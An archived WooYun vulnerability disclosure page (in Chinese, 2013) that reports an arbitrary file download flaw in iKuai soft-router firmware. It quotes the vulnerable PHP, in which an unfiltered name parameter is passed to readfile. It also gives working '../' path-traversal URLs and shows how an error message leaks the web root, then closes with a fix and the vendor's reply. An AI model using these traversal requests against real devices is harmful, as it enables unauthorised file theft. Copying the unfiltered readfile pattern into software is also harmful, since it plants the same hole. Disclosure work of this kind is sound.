@@ -1,0 +1,217 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		爱快软路由任意文件下载漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		爱快软路由任意文件下载漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/LinE">LinE</a> 
+</li><li>提交时间：		2013-07-11 18:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-11：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-14：	细节向第三方安全合作伙伴开放<br/>
+									2013-07-21：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-31：	细节向普通白帽子公开<br/>
+									2013-08-20：	细节向实习白帽子公开<br/>
+									2013-10-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于软路由配置不当导致任意文件可被下载，</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">进入软路由WEB配置之后，选择 升级/备份，然后新建一份备份，可以获得下载的url<br />
+<br />
+例如：http://192.168.1.1/cgi-bin/upload.php?name=2013-07-11-001700.bak<br />
+<br />
+由于name未做任何过滤导致可以下载任意文件<br />
+<br />
+具体代码<br />
+<br />
+行9-行18<br />
+<br />
+</p><pre><code>if(isset($_GET[&#039;name&#039;])){ <br />
+    $filename = $filepath.$_GET[&#039;name&#039;];<br />
+	<br />
+	header(&quot;Content-Type: application/force-download&quot;);<br />
+	header(&quot;Content-Type: application/octet-stream&quot;);<br />
+	header(&quot;Content-Type: application/download&quot;);  <br />
+	header(&quot;Content-Disposition: attachment; filename=&quot;.$_GET[&#039;name&#039;]);  <br />
+	header(&#039;Content-Transfer-Encoding: binary&#039;);<br />
+	readfile($filename);<br />
+}</code></pre><p class='detail'><br />
+<br />
+没有任何过滤， 直接就提交到readfile函数<br />
+<br />
+于是可以构造任意文件下载，在name后加上很多../<br />
+<br />
+例如http://192.168.1.1/cgi-bin/upload.php?name=../../../../../../<br />
+<br />
+得知网站目录的绝对路径过程很扯淡- -！在name后面随便输了个东西，结果下载到一个文件··<br />
+<br />
+内容是<br />
+<br />
+</p><pre><code>&lt;br /&gt;<br />
+&lt;b&gt;Warning&lt;/b&gt;:  readfile(/etc/mnt/bak/../../../../../123) [&lt;a href=&#039;function.readfile&#039;&gt;function.readfile&lt;/a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;/tmp/ikuai/www/cgi-bin/upload.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</code></pre><p class='detail'><br />
+<br />
+由最后的on line XX之前得到upload.php绝对路径，从而获得了网站的绝对路径<br />
+<br />
+/tmp/ikuai/www/<br />
+<br />
+然后就可以构造路径来下载东西<br />
+<br />
+比如下载upload.php<br />
+<br />
+http://192.168.1.1/cgi-bin/upload.php?name=../../../../../../tmp/ikuai/www/cgi-bin/upload.php<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1101465665d9525134aeaf27f65549ddad756ad8.png" target="_blank"><img src="../images/1101465665d9525134aeaf27f65549ddad756ad8.png" alt="down.png" width="600"/></a></p><p class="detail"><br />
+<br />
+返回下载对话框<br />
+<br />
+</p><p class="detail"><a href="../images/110147156ce0a692b4c4ec496dbac41308fb53d4.png" target="_blank"><img src="../images/110147156ce0a692b4c4ec496dbac41308fb53d4.png" alt="rename.png" width="600"/></a></p><p class="detail"><br />
+<br />
+保存之后把后缀改成php，然后打开就能看到源代码···<br />
+<br />
+</p><p class="detail"><a href="../images/110149037bd55320e8e54dccc68805e00f50f60b.png" target="_blank"><img src="../images/110149037bd55320e8e54dccc68805e00f50f60b.png" alt="upload.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">下载之前加上过滤，过滤掉类似于. /的符号，或者仅允许bak文件下载 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/LinE" title="LinE">LinE</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-028508" title="爱快软路由任意文件下载漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-07-11 19:09</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢这位朋友，爱快希望更完善自己的系统，如果愿意合作参与爱快的漏洞寻找，可以联系我QQ:1808663661</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="28508";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
